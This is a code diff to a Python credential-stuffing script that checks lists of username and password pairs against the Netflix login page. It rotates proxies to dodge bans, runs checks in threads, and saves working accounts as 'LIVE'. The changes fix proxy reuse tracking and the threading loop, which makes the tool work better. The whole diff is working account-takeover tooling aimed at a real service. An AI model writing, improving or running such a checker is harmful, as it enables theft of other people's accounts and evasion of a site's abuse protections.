@@ -104,8 +104,8 @@ def transform(stream: TextIOWrapper, file_type: FileType)   -> list[tuple]:
         if file_type != None: print(Fore.RED,  f'   Malformed {file_type.name}: {len(malformed_data)}')
         return list_data
     except Exception:
-        print_error("    Error transforming file")
-        print_error(f'    Exception: {str(Exception)}')
+        print_error("   Error transforming file")
+        print_error(f'   Exception: {str(Exception)}')
         sys.exit()
         
 def load_file(file_name: str) -> TextIOWrapper:
@@ -118,7 +118,7 @@ def load_file(file_name: str) -> TextIOWrapper:
 
 def check_available_proxie_in_queue(proxy: str) -> bool:
     global LAST_USED_PROXIES
-    if proxy in LAST_USED_PROXIES: return False
+    if len(LAST_USED_PROXIES) > 0 and  proxy in LAST_USED_PROXIES: return False
     return True
     
 def purge_last_used_proxes() -> None:
@@ -138,7 +138,7 @@ def generate_request_proxy(proxies: list[tuple]) -> dict | None:
 
     choosen_proxy = random.choice(available_proxies)
     build_proxy = build_proxy_address(choosen_proxy)
-
+    
     return {
         "http": build_proxy
     }
@@ -174,6 +174,7 @@ def check_account(account: tuple, proxy: dict) -> None:
     br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'), ('Content-Type','application/json')]
     br.set_proxies(proxies=proxy)
 
+    
     try:
         br.open('https://www.netflix.com/co-en/login')
         br.select_form(nr=0)
@@ -182,20 +183,20 @@ def check_account(account: tuple, proxy: dict) -> None:
     
         print(Fore.WHITE, "   ========================================================")
         print(Fore.GREEN,f'   Testing account {account}')
-    
+        print(Fore.YELLOW, f'   Choosen proxy: {proxy}')
         response = br.submit()
         if response.geturl() == "https://www.netflix.com/browse":
             print(Fore.YELLOW, f'   Account working: {account}')
             save_account(data=account, accounts_state=AccountState.LIVE)
         else:
-            print(Fore.RED, f'   Account die: {account}')
+            #print(Fore.RED, f'   Account die: {account}')
             save_account(data=account, accounts_state=AccountState.DIE)
-        #LAST_USED_PROXIES.append(proxy["http"])
+        LAST_USED_PROXIES.append(proxy["http"])
     except HTTPError as e:
         global DIE_PROXIES
         if e.code == 403:
             DIE_PROXIES.append(proxy["http"])
-            print(Fore.GREEN, "Netflix ban")
+            print(Fore.GREEN, "   Netflix ban")
     except Exception:
         print_error(f'   Cheking error: {Exception}')
 
@@ -205,13 +206,12 @@ def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
     available_threads = check_available_threads(available_cores=available_cores)
     init_schedule(purge_last_used_proxes, 2)
     try:
-        while available_threads != 0:
+        while len(purgued_accounts) > 0:
             active_threads: list = []
-            for i in range(0, available_threads -1):
+            for i in range(0, 3):
                 proxy = generate_request_proxy(proxies=proxies)
                 if(proxy == None):
                     raise ValueError("Non available proxies")
-                #check_account(account=purgued_accounts[i], proxy=proxy)
                 thread = threading.Thread(target=check_account, args=(purgued_accounts[i], proxy))
                 thread.start()
                 active_threads.append(thread)
